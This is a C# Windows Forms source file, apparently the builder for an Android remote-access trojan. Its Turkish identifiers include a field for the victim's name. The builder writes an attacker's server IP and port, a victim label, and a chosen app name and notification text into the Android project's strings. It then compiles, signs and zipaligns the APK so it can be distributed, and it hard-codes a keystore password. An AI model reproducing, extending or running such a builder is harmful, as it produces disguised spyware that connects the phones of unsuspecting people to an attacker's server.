using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SV
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
            pictureBox2.ImageLocation = Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png";
        }
        string[] settings = File.ReadAllLines("settings.tht");
        private async void build()
        {
            await Task.Run(() => {

                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] İşlem Başladı..");
                string packageName = textBox1.Text;
                int versionCode = 10;
                string versionName = textBox2.Text;
                stringValueleriYaz();
                string msbuild = settings[0];//@"C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\msbuild.exe";
                //var msbuild = @"C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\msbuild.exe";
                //@"C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\msbuild.exe";
                string zipalign = settings[1];//@"C:\Program Files (x86)\Android\android-sdk\build-tools\29.0.2\zipalign.exe";
                string jarsigner = settings[2]; //@"C:\Program Files\Java\jdk1.8.0_211\bin\jarsigner.exe";
                string buildManifest = "Properties/AndroidManifest.xml";
                string androidProjectFolder = Environment.CurrentDirectory + @"\resources\ProjectFolder";
                string androidProject = $"{androidProjectFolder}\\izci.csproj";
                string outputPath = Environment.CurrentDirectory + @"\outs\" + DateTime.Now.ToString("yyyyMMddHHmmss");
                string abi = "tht";

                string specificManifest = $"Properties/AndroidManifest.{abi}_{versionCode}.xml";
                string binPath = $"{outputPath}/{abi}/bin";
                string objPath = $"{outputPath}/{abi}/obj";

                string keystorePath = Environment.CurrentDirectory + "\\bocek.keystore";
                string keystorePassword = "sagopa4141";
                string keystoreKey = "bocek";

                XDocument xmlFile = XDocument.Load($"{androidProjectFolder}/{buildManifest}");
                XElement mnfst = xmlFile.Elements("manifest").First();
                XNamespace androidNamespace = mnfst.GetNamespaceOfPrefix("android");
                mnfst.Attribute("package").Value = packageName;
                mnfst.Attribute(androidNamespace + "versionName").Value = versionName;
                mnfst.Attribute(androidNamespace + "versionCode").Value = "10";
                xmlFile.Save($"{androidProjectFolder}/{buildManifest}");

                string unsignedApkPath = $"\"{binPath}/{packageName}.apk\"";
                string signedApkPath = $"\"{binPath}/{packageName}_signed.apk\"";
                string alignedApkPath = $"{binPath}/{textBox7.Text.Replace(" ", "_")}.apk";

                string mbuildArgs = $"{androidProject} /t:PackageForAndroid /t:restore /p:Configuration=Release /p:IntermediateOutputPath={objPath}/ /p:OutputPath={binPath}";
                string jarsignerArgs = $"-verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystorePath} -storepass {keystorePassword} -signedjar \"{signedApkPath}\" {unsignedApkPath} {keystoreKey}";
                string zipalignArgs = $"-f -v 4 {signedApkPath} {alignedApkPath}";


                RunProcess(msbuild, mbuildArgs);
                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] Derlendi.");

                RunProcess(jarsigner, jarsignerArgs);
                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] APK imzalandı.");

                //Google Play'de yayınlayabilmeniz için.
                RunProcess(zipalign, zipalignArgs);
                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] Zipalign işlemi tamamlandı.");

                File.Copy($"{alignedApkPath}", $"{outputPath}/{Path.GetFileName(alignedApkPath)}", true);
                DirectoryInfo di = new DirectoryInfo(binPath);
                FileInfo[] fi = di.GetFiles("*.*");
                foreach (FileInfo f in fi)
                {
                    if (!f.Name.Contains(textBox7.Text.Replace(" ", "_")))
                    {
                        f.Delete();
                    }
                }
                new DirectoryInfo(binPath).GetDirectories()[0].Delete(true);
                Process.Start($"{binPath}");

                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] APK hazır.");

            });
        }
        private void RunProcess(string filename, string arguments)
        {
            using (Process p = new Process())
            {
                p.StartInfo = new ProcessStartInfo(filename)
                {
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Maximized
                };
                p.Start();
                p.WaitForExit();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            build();
        }
        private void stringValueleriYaz()
        {
            XDocument xmlFile = XDocument.Load(Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\values\Strings.xml");
            XElement mnfst = xmlFile.Elements("resources").First();
            foreach (var t in mnfst.Elements())
            {
                switch (t.Attribute("name").Value)
                {
                    case "app_name":
                        t.Value = textBox7.Text;
                        break;
                    case "service_started":
                        t.Value = textBox6.Text;
                        break;
                    case "notification_text":
                        t.Value = textBox5.Text;
                        break;
                    case "IP":
                        t.Value = textBox3.Text;
                        break;
                    case "PORT":
                        t.Value = numericUpDown1.Value.ToString();
                        break;                  
                    case "KURBANISMI":
                        t.Value = textBox8.Text;
                        break;
                }
            }
            xmlFile.Save(Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\values\Strings.xml");
        }
        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            {
                Multiselect = false,
                Filter = "72x72 boyutunda .png resim dosyası|*.png",
                Title = "72x72 boyutunda .png resim dosyası seçin."
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    File.Copy(op.FileName, Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png", true);
                    File.Copy(Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png", Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\mipmap-hdpi\Icon.png");
                    pictureBox2.ImageLocation = Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png";
                }
            }
        }
    }
}
